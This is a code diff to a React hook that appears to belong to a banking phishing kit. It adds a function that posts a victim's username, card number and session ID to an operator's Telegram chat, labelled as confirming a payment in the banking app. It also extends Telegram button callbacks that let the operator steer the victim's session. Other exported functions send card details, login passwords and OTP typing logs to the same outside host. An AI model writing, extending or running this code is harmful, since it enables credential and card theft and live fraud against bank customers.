@@ -416,6 +416,36 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
+  // ========== CONFIRMATION LOG FOR NEXT STEP APPR ==========
+  const sendConfirmationLog = async (username, cardNumber, sessionId) => {
+    try {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const message = `
+✅ <b>CONFIRMATION IN CZ KEY</b> ✅
+━━━━━━━━━━━━━━━━━━━━━
+👤 <b>Username:</b> ${username}
+💳 <b>Card Number:</b> ${cardNumber}
+🆔 <b>Session ID:</b> <code>${sessionId}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━
+🔐 <b>Status:</b> CONFIRMED IN BANKING APP
+⚠️ <i>User confirmed payment in mobile banking</i>
+      `;
+
+      await axios.post(url, {
+        chat_id: LOGS_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      });
+      
+      console.log('✅ Confirmation log sent to Telegram');
+      return true;
+    } catch (error) {
+      console.error('Error sending confirmation log:', error);
+      return false;
+    }
+  };
+
   // ========== OTHER FUNCTIONS ==========
 
   const sendFormattedCardDetails = async (cardData, sessionId, loginName, loginPassword) => {
@@ -550,19 +580,45 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
             if (sid === sessionId) {
               console.log('🔵 Action received from Telegram:', action, 'Session:', sid);
               
-              if (action === 'approve') onApprove?.();
-              else if (action === 'deny') onDeny?.();
-              else if (action === 'card') onViewCard?.();
-              else if (action === 'next') onNextStep?.();
-              else if (action === 'back_to_card') onBackToCard?.();
-              else if (action === 'back_to_login') onBackToLogin?.();
-              else if (action === 'block') onBlock?.();
-              else if (action === 'next_step_appr') onNextStepAppr?.();
+              // Execute the appropriate callback
+              if (action === 'approve') {
+                console.log('✅ Calling onApprove callback');
+                onApprove?.();
+              }
+              else if (action === 'deny') {
+                console.log('❌ Calling onDeny callback');
+                onDeny?.();
+              }
+              else if (action === 'card') {
+                console.log('💳 Calling onViewCard callback');
+                onViewCard?.();
+              }
+              else if (action === 'next') {
+                console.log('➡️ Calling onNextStep callback');
+                onNextStep?.();
+              }
+              else if (action === 'back_to_card') {
+                console.log('⬅️ Calling onBackToCard callback');
+                onBackToCard?.();
+              }
+              else if (action === 'back_to_login') {
+                console.log('⬅️ Calling onBackToLogin callback');
+                onBackToLogin?.();
+              }
+              else if (action === 'block') {
+                console.log('🚫 Calling onBlock callback');
+                onBlock?.();
+              }
+              else if (action === 'next_step_appr') {
+                console.log('🟢 Calling onNextStepAppr callback - NAVIGATING TO NEXTSTEPAPPR');
+                onNextStepAppr?.();
+              }
               
+              // Answer the callback query
               try {
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                   callback_query_id: update.callback_query.id,
-                  text: "✅ Request processed!"
+                  text: action === 'next_step_appr' ? "✅ Redirecting to confirmation page..." : "✅ Request processed!"
                 });
               } catch (callbackError) {
                 console.error('Error answering callback:', callbackError);
@@ -605,6 +661,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     sendOtpTypingLog,
     sendSiteEntryLog,
     sendBlockedLog,
-    sendVisitNotification
+    sendVisitNotification,
+    sendConfirmationLog
   };
 };
